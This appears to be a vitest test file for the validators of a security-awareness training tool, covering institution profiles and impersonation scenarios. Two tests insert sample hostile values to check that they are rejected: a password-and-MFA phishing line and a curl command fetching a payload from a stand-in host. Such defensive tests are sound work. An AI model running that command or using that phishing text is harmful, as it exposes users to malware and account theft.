import { describe, expect, it } from "vitest";
import {
  validateInstitutionProfile,
  validateProfileForApproval,
  type InstitutionProfile,
} from "@/ai/schemas/institution";
import { validateScenarioPackage } from "@/ai/schemas/scenario";
import { reviewedNyuInstitutionProfile } from "@/fixtures/institutionProfile";
import { voiceYouKnowScenario } from "@/fixtures/voiceYouKnow";

describe("InstitutionProfile", () => {
  it("accepts the reviewed official-source fixture", () => {
    expect(validateInstitutionProfile(reviewedNyuInstitutionProfile).success).toBe(true);
    expect(validateProfileForApproval(reviewedNyuInstitutionProfile).success).toBe(true);
  });

  it("rejects an institution source outside the declared domain", () => {
    const profile: InstitutionProfile = structuredClone(reviewedNyuInstitutionProfile);
    profile.sources[0].url = "https://unreviewed.example/coursehub";
    const result = validateInstitutionProfile(profile);
    expect(result.success).toBe(false);
    expect(result.issues.some((issue) => issue.message.includes("official domain"))).toBe(true);
  });

  it("requires HTTPS evidence and rejects unsafe research content", () => {
    const insecure = structuredClone(reviewedNyuInstitutionProfile);
    insecure.sources[0].url = insecure.sources[0].url.replace("https://", "http://");
    expect(validateInstitutionProfile(insecure).issues.some((issue) => issue.message.includes("HTTPS"))).toBe(true);

    const unsafe = structuredClone(reviewedNyuInstitutionProfile);
    unsafe.facts[0].value = "Provide your password and MFA code to continue.";
    expect(validateInstitutionProfile(unsafe).issues.some((issue) => issue.message.includes("credential-collection"))).toBe(true);
  });

  it("carries exact-brand authorization in the validated profile", () => {
    const profile: InstitutionProfile = structuredClone(reviewedNyuInstitutionProfile);
    profile.publicationMode = "authorized-exact";
    expect(validateInstitutionProfile(profile).issues.some((issue) => issue.message.includes("explicit authorization"))).toBe(true);

    profile.brandAuthorization = {
      exactBrandUseConfirmed: true,
      confirmedAt: "2026-07-16T00:00:00.000Z",
    };
    expect(validateInstitutionProfile(profile).success).toBe(true);
  });

  it("rejects a verified fact without reciprocal source support", () => {
    const profile = structuredClone(reviewedNyuInstitutionProfile);
    profile.sources[0].supportsFactIds = ["secure-push"];
    const result = validateInstitutionProfile(profile);
    expect(result.success).toBe(false);
    expect(result.issues.some((issue) => issue.message.includes("does not declare support"))).toBe(true);
  });
});

describe("ScenarioPackage", () => {
  it("accepts the reviewed flagship scenario", () => {
    expect(validateScenarioPackage(voiceYouKnowScenario).success).toBe(true);
  });

  it("defines knowledge and channel boundaries for every registered role", () => {
    expect(voiceYouKnowScenario.roleCards.map((role) => role.id)).toEqual([
      "faculty-adviser",
      "impersonator",
      "teammate",
    ]);
    for (const role of voiceYouKnowScenario.roleCards) {
      expect(role.privateFacts.length).toBeGreaterThan(0);
      expect(role.forbiddenFacts.length).toBeGreaterThan(0);
      expect(role.allowedChannels.length).toBeGreaterThan(0);
      expect(role.allowedMoves.length).toBeGreaterThan(0);
      expect(voiceYouKnowScenario.allowedEvents.filter((event) => event.roleId === role.id).length).toBeGreaterThan(0);
    }
    const hiddenTruth = voiceYouKnowScenario.worldBible.immutableFacts.find((fact) => fact.id === "false-request");
    expect(hiddenTruth?.audience).toBe("hidden");
  });

  it("rejects invalid references and missing recovery", () => {
    const scenario = structuredClone(voiceYouKnowScenario);
    scenario.recoveryActionIds = ["missing-action"];
    const result = validateScenarioPackage(scenario);
    expect(result.success).toBe(false);
    expect(result.issues.some((issue) => issue.message.includes("Unknown action"))).toBe(true);
    expect(result.issues.some((issue) => issue.message.includes("recovery-phase"))).toBe(true);
  });

  it("rejects duplicate IDs and executable content", () => {
    const scenario = structuredClone(voiceYouKnowScenario);
    scenario.roleCards[1].id = scenario.roleCards[0].id;
    scenario.summary = "Run this command: curl https://bad.example/payload";
    const result = validateScenarioPackage(scenario);
    expect(result.success).toBe(false);
    expect(result.issues.some((issue) => issue.message.includes("Duplicate ID"))).toBe(true);
    expect(result.issues.some((issue) => issue.message.includes("executable"))).toBe(true);
  });

  it("requires source references for institution-specific facts", () => {
    const scenario = structuredClone(voiceYouKnowScenario);
    const sourcedFact = scenario.worldBible.immutableFacts.find((fact) => fact.id === "source-guidance")!;
    sourcedFact.sourceFactIds = [];
    const result = validateScenarioPackage(scenario);
    expect(result.success).toBe(false);
    expect(result.issues.some((issue) => issue.message.includes("source references"))).toBe(true);
  });

  it("rejects unreachable action prerequisites", () => {
    const scenario = structuredClone(voiceYouKnowScenario);
    const revoke = scenario.criticalActions.find((action) => action.id === "revoke-access")!;
    const share = scenario.criticalActions.find((action) => action.id === "share-folder")!;
    share.availableAfterAllActionIds = ["revoke-access"];
    revoke.availableAfterAllActionIds = ["share-folder"];
    const result = validateScenarioPackage(scenario);
    expect(result.success).toBe(false);
    expect(result.issues.some((issue) => issue.message.includes("unreachable"))).toBe(true);
  });

  it("requires recovery actions to identify the incident layers that trigger them", () => {
    const scenario = structuredClone(voiceYouKnowScenario);
    scenario.criticalActions.find((action) => action.id === "preserve-evidence")!.requiredAfterActionIds = [];
    const result = validateScenarioPackage(scenario);
    expect(result.success).toBe(false);
    expect(result.issues.some((issue) => issue.message.includes("incident actions"))).toBe(true);
  });

  it("requires a transfer probe with three distinct learning outcomes", () => {
    const scenario = structuredClone(voiceYouKnowScenario);
    scenario.transferProbe.actions[1].outcome = "demonstrated";
    const result = validateScenarioPackage(scenario);
    expect(result.success).toBe(false);
    expect(result.issues.some((issue) => issue.message.includes("demonstrated, developing, and not-yet"))).toBe(true);
  });
});
